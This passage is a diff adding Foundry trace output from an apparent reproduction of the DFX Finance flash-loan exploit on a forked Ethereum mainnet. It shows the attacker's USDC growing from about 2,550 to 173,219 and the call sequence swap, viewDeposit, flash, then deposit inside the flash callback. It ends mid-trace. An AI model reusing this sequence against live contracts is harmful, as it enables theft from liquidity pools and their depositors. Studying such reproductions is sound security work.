@@ -1,0 +1,406 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/DFX_exp.sol:ContractTest
+[PASS] testExploit() (gas: 763321)
+Logs:
+  [Before] Attacker USDC balance before exploit: 2550.005819
+  [End] Attacker USDC balance after exploit: 173219.649163
+
+Traces:
+  [5779] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 15941703 [1.594e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [817121] ContractTest::testExploit()
+    ├─ [23731] WETH9::fallback{value: 2000000000000000000}()
+    │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 2000000000000000000 [2e18])
+    │   ├─  storage changes:
+    │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000001bc16d674ec80000
+    │   └─ ← [Stop]
+    ├─ [24420] WETH9::approve(SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─  storage changes:
+    │   │   @ 0xea1c3a4a4742936b53e6e02c27b97246c87f6290ad743a3efb6894b7bf708cd4: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   └─ ← [Return] true
+    ├─ [38367] FiatTokenProxy::fallback(SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ [31078] FiatTokenV2_1::approve(SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xc81d9832a58ca5596ef91aeee7b9876071d1b466739bb153bc12d9794dc6ec7e: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [27867] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ [27078] FiatTokenV2_1::approve(0x46161158b1947D9149E066d6d31AF1283b2d377C, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x46161158b1947D9149E066d6d31AF1283b2d377C, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x27266a933beee98a83cf358f7efd3bce1608669ec0990dc938739b848f5d91f1: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [38458] FiatTokenProxy::fallback(SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ [31176] FiatTokenV1::approve(SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x79d9846fbf5ba218e1675f258b761876af9d0333b76e2773cfc8b3432ed7262b: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [27958] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ [27176] FiatTokenV1::approve(0x46161158b1947D9149E066d6d31AF1283b2d377C, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x46161158b1947D9149E066d6d31AF1283b2d377C, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x6200be9415d665c0b9d12b8ae15eba82ec01318cb52c0c916659aca2d93e6373: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [534] WETH9::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 2000000000000000000 [2e18]
+    ├─ [86356] SwapRouter::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, tokenOut: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, fee: 500, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1668108467 [1.668e9], amountIn: 2000000000000000000 [2e18], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
+    │   ├─ [78895] UniswapV3Pool::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 2000000000000000000 [2e18], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bc02aaa39b223fe8d0a0e5c4f27ead9083c756cc20001f4a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000)
+    │   │   ├─ [33517] FiatTokenProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2550005819 [2.55e9])
+    │   │   │   ├─ [32728] FiatTokenV2_1::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2550005819 [2.55e9]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: UniswapV3Pool: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2550005819 [2.55e9])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0 → 0x0000000000000000000000000000000000000000000000000000000097fe003b
+    │   │   │   │   │   @ 0x1f21a62c4538bacf2aabeca410f0fe63151869f172e03c0e00357ba26a341eff: 0x0000000000000000000000000000000000000000000000000000290c56149564 → 0x0000000000000000000000000000000000000000000000000000290bbe169529
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2534] WETH9::balanceOf(UniswapV3Pool: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]) [staticcall]
+    │   │   │   └─ ← [Return] 71950373467838886518948 [7.195e22]
+    │   │   ├─ [10327] SwapRouter::uniswapV3SwapCallback(-2550005819 [-2.55e9], 2000000000000000000 [2e18], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bc02aaa39b223fe8d0a0e5c4f27ead9083c756cc20001f4a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000)
+    │   │   │   ├─ [6225] WETH9::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], UniswapV3Pool: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], 2000000000000000000 [2e18])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UniswapV3Pool: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], value: 2000000000000000000 [2e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x390f6178407c9b8e95802b8659e6df8e34c1e3d4f8d6a49e6132bbcdd937b63a: 0x000000000000000000000000000000000000000000000f3c700403953b5520a4 → 0x000000000000000000000000000000000000000000000f3c8bc570fc8a1d20a4
+    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000001bc16d674ec80000 → 0
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [534] WETH9::balanceOf(UniswapV3Pool: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]) [staticcall]
+    │   │   │   └─ ← [Return] 71952373467838886518948 [7.195e22]
+    │   │   ├─ emit Swap(sender: SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0: -2550005819 [-2.55e9], amount1: 2000000000000000000 [2e18], sqrtPriceX96: 2218280876708103843786705821220208 [2.218e33], liquidity: 13596670582240942422 [1.359e19], tick: 204808 [2.048e5])
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0x00000000000000000000000000000b1c84a6d89495c016482a6509e7d4e37750 → 0x00000000000000000000000000000b1c84abaa8055d80739d2994ead4061260a
+    │   │   │   @ 0: 0x00010002d002d001200320080000000000006d5e7e733919ccb8355c9a42bbde → 0x00010002d002d001200320080000000000006d5ea41668fac7aaa45d0a67bd70
+    │   │   └─ ← [Return] -2550005819 [-2.55e9], 2000000000000000000 [2e18]
+    │   └─ ← [Return] 2550005819 [2.55e9]
+    ├─ [1315] FiatTokenProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [529] FiatTokenV2_1::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 2550005819 [2.55e9]
+    │   └─ ← [Return] 2550005819 [2.55e9]
+    ├─ emit log_named_decimal_uint(key: "[Before] Attacker USDC balance before exploit", val: 2550005819 [2.55e9], decimals: 6)
+    ├─ [1315] FiatTokenProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [529] FiatTokenV2_1::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 2550005819 [2.55e9]
+    │   └─ ← [Return] 2550005819 [2.55e9]
+    ├─ [101664] SwapRouter::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, tokenOut: 0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52, fee: 500, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1668108467 [1.668e9], amountIn: 1275002909 [1.275e9], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
+    │   ├─ [94232] UniswapV3Pool::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 1275002909 [1.275e9], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002ba0b86991c6218b36c1d19d4a2e9eb0ce3606eb480001f4ebf2096e01455108badcbaf86ce30b6e5a72aa52000000000000000000000000000000000000000000)
+    │   │   ├─ [34121] FiatTokenProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19873424633278 [1.987e13])
+    │   │   │   ├─ [33339] FiatTokenV1::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19873424633278 [1.987e13]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: UniswapV3Pool: [0xE558f01FCb39B11B2000D11e9a18DcF105f78964], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 19873424633278 [1.987e13])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000001213246a6dbe
+    │   │   │   │   │   @ 0xb496c955f42445db28fa18b947aeed77cf415101c881261bd65945ecae63ac22: 0x000000000000000000000000000000000000000000000000001fbdb38f43ddd8 → 0x000000000000000000000000000000000000000000000000001faba06ad9701a
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [3315] FiatTokenProxy::fallback(UniswapV3Pool: [0xE558f01FCb39B11B2000D11e9a18DcF105f78964]) [staticcall]
+    │   │   │   ├─ [2529] FiatTokenV2_1::balanceOf(UniswapV3Pool: [0xE558f01FCb39B11B2000D11e9a18DcF105f78964]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 220128727822 [2.201e11]
+    │   │   │   └─ ← [Return] 220128727822 [2.201e11]
+    │   │   ├─ [14848] SwapRouter::uniswapV3SwapCallback(1275002909 [1.275e9], -19873424633278 [-1.987e13], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002ba0b86991c6218b36c1d19d4a2e9eb0ce3606eb480001f4ebf2096e01455108badcbaf86ce30b6e5a72aa52000000000000000000000000000000000000000000)
+    │   │   │   ├─ [10792] FiatTokenProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], UniswapV3Pool: [0xE558f01FCb39B11B2000D11e9a18DcF105f78964], 1275002909 [1.275e9])
+    │   │   │   │   ├─ [9997] FiatTokenV2_1::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], UniswapV3Pool: [0xE558f01FCb39B11B2000D11e9a18DcF105f78964], 1275002909 [1.275e9]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UniswapV3Pool: [0xE558f01FCb39B11B2000D11e9a18DcF105f78964], value: 1275002909 [1.275e9])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xc81d9832a58ca5596ef91aeee7b9876071d1b466739bb153bc12d9794dc6ec7e: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffb400ffe2
+    │   │   │   │   │   │   @ 0x6880afd761842d3cdeedc0b7f76510afeab822c4b73a4bf299e44894163ee697: 0x0000000000000000000000000000000000000000000000000000003340b1d30e → 0x000000000000000000000000000000000000000000000000000000338cb0d32b
+    │   │   │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0x0000000000000000000000000000000000000000000000000000000097fe003b → 0x000000000000000000000000000000000000000000000000000000004bff001e
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1315] FiatTokenProxy::fallback(UniswapV3Pool: [0xE558f01FCb39B11B2000D11e9a18DcF105f78964]) [staticcall]
+    │   │   │   ├─ [529] FiatTokenV2_1::balanceOf(UniswapV3Pool: [0xE558f01FCb39B11B2000D11e9a18DcF105f78964]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 221403730731 [2.214e11]
+    │   │   │   └─ ← [Return] 221403730731 [2.214e11]
+    │   │   ├─ emit Swap(sender: SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0: 1275002909 [1.275e9], amount1: -19873424633278 [-1.987e13], sqrtPriceX96: 9892863035578907563257468411349 [9.892e30], liquidity: 735939883996233 [7.359e14], tick: 96549 [9.654e4])
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0x000000000000000000000000000000000000488a00b0ab8d0dc4e9790d6ea091 → 0x000000000000000000000000000000000000488db9221a4db5d608124488cf48
+    │   │   │   @ 8: 0x010059e4bf00000031f6d38f521f7f321375ca366b0002a0eeec0b00636c191f → 0x010059e4bf000000326dfee6fb06aee5a33982fda20002a2ba2f6cd0636d50b3
+    │   │   │   @ 0: 0x000100004a004a0049017929000000000000007ce47a3fc3a6f0669e47a4af9c → 0x000100004a004a0000017925000000000000007cdd908173cf479a2d2341ddd5
+    │   │   └─ ← [Return] 1275002909 [1.275e9], -19873424633278 [-1.987e13]
+    │   └─ ← [Return] 19873424633278 [1.987e13]
+    ├─ [60878] 0x46161158b1947D9149E066d6d31AF1283b2d377C::viewDeposit(200000000000000000000000 [2e23]) [staticcall]
+    │   ├─ [54534] ProportionalLiquidity::822f39d5(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002a5a058fc295ed000000) [delegatecall]
+    │   │   ├─ [9493] 0x08CD9D993840ccA86546f4Ebf166C78c7d8ff700::viewNumeraireBalanceLPRatio(500000000000000000 [5e17], 500000000000000000 [5e17], 0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   ├─ [3615] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   ├─ [2836] FiatTokenV1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 10242926208370988 [1.024e16]
+    │   │   │   │   └─ ← [Return] 10242926208370988 [1.024e16]
+    │   │   │   ├─ [3315] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   ├─ [2529] FiatTokenV2_1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   │   │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000006d62aa5e2045b0d325283
+    │   │   ├─ [5193] 0xc2E645C253FAf984B6Af2668798719b7c6AbAB95::viewNumeraireBalanceLPRatio(500000000000000000 [5e17], 500000000000000000 [5e17], 0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   ├─ [1315] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   ├─ [529] FiatTokenV2_1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   │   │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   │   │   ├─ [1315] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   ├─ [529] FiatTokenV2_1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   │   │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000006d62aa5e2046c764adff8
+    │   │   ├─ [6098] 0x08CD9D993840ccA86546f4Ebf166C78c7d8ff700::viewRawAmountLPRatio(500000000000000000 [5e17], 500000000000000000 [5e17], 0x46161158b1947D9149E066d6d31AF1283b2d377C, 1844674407370946816507483 [1.844e24]) [staticcall]
+    │   │   │   ├─ [1615] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   ├─ [836] FiatTokenV1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 10242926208370988 [1.024e16]
+    │   │   │   │   └─ ← [Return] 10242926208370988 [1.024e16]
+    │   │   │   ├─ [1315] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   ├─ [529] FiatTokenV2_1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   │   │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000008431a9cf6f28d
+    │   │   ├─ [5798] 0xc2E645C253FAf984B6Af2668798719b7c6AbAB95::viewRawAmountLPRatio(500000000000000000 [5e17], 500000000000000000 [5e17], 0x46161158b1947D9149E066d6d31AF1283b2d377C, 1844674407370963506360810 [1.844e24]) [staticcall]
+    │   │   │   ├─ [1315] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   ├─ [529] FiatTokenV2_1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   │   │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   │   │   ├─ [1315] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   ├─ [529] FiatTokenV2_1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   │   │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000174876e800
+    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000003fc5f9cf6773036aa831000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000008431a9cf6f28d000000000000000000000000000000000000000000000000000000174876e800
+    │   └─ ← [Return] 301161097723287729514545 [3.011e23], [2325581395325581 [2.325e15], 100000000000 [1e11]]
+    ├─ [184812] 0x46161158b1947D9149E066d6d31AF1283b2d377C::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2313953488348953 [2.313e15], 99500000000 [9.95e10], 0x00)
+    │   ├─ [1615] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   ├─ [836] FiatTokenV1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   └─ ← [Return] 10242926208370988 [1.024e16]
+    │   │   └─ ← [Return] 10242926208370988 [1.024e16]
+    │   ├─ [1315] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   ├─ [529] FiatTokenV2_1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   ├─ [1615] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   ├─ [836] FiatTokenV1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   └─ ← [Return] 10242926208370988 [1.024e16]
+    │   │   └─ ← [Return] 10242926208370988 [1.024e16]
+    │   ├─ [1315] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   ├─ [529] FiatTokenV2_1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   ├─ [8221] FiatTokenProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2313953488348953 [2.313e15])
+    │   │   ├─ [7439] FiatTokenV1::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2313953488348953 [2.313e15]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: 0x46161158b1947D9149E066d6d31AF1283b2d377C, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2313953488348953 [2.313e15])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000001213246a6dbe → 0x00000000000000000000000000000000000000000000000000084a9a6c1d94d7
+    │   │   │   │   @ 0x2ab45554ddc555337b8c9745aa671fca07bf60d725b8f7b13ed4b399e25648fc: 0x000000000000000000000000000000000000000000000000002463e31a1c492c → 0x000000000000000000000000000000000000000000000000001c2b5bd2692213
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [7617] FiatTokenProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99500000000 [9.95e10])
+    │   │   ├─ [6828] FiatTokenV2_1::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99500000000 [9.95e10]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: 0x46161158b1947D9149E066d6d31AF1283b2d377C, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 99500000000 [9.95e10])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0x000000000000000000000000000000000000000000000000000000004bff001e → 0x0000000000000000000000000000000000000000000000000000001776a8831e
+    │   │   │   │   @ 0x035625c05f7d9c5fd4a9920133569f332225ace0da62b2232866e04e40817a91: 0x00000000000000000000000000000000000000000000000000000068516c41ac → 0x0000000000000000000000000000000000000000000000000000005126c2beac
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [109207] ContractTest::flashCallback(11569767441745 [1.156e13], 497500000 [4.975e8], 0x00)
+    │   │   ├─ [83951] 0x46161158b1947D9149E066d6d31AF1283b2d377C::deposit(200000000000000000000000 [2e23], 1668108527 [1.668e9])
+    │   │   │   ├─ [78361] ProportionalLiquidity::445cc62b(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002a5a058fc295ed000000) [delegatecall]
+    │   │   │   │   ├─ [5493] 0x08CD9D993840ccA86546f4Ebf166C78c7d8ff700::viewNumeraireBalanceLPRatio(500000000000000000 [5e17], 500000000000000000 [5e17], 0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   │   ├─ [1615] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   │   │   ├─ [836] FiatTokenV1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 7928972720022035 [7.928e15]
+    │   │   │   │   │   │   └─ ← [Return] 7928972720022035 [7.928e15]
+    │   │   │   │   │   ├─ [1315] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   │   │   ├─ [529] FiatTokenV2_1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 348542647980 [3.485e11]
+    │   │   │   │   │   │   └─ ← [Return] 348542647980 [3.485e11]
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000005517ea5e2046a8632823c
+    │   │   │   │   ├─ [5193] 0xc2E645C253FAf984B6Af2668798719b7c6AbAB95::viewNumeraireBalanceLPRatio(500000000000000000 [5e17], 500000000000000000 [5e17], 0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   │   ├─ [1315] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   │   │   ├─ [529] FiatTokenV2_1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 348542647980 [3.485e11]
+    │   │   │   │   │   │   └─ ← [Return] 348542647980 [3.485e11]
+    │   │   │   │   │   ├─ [1315] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   │   │   ├─ [529] FiatTokenV2_1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 348542647980 [3.485e11]
+    │   │   │   │   │   │   └─ ← [Return] 348542647980 [3.485e11]
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000005517ea5e2046c764adff8
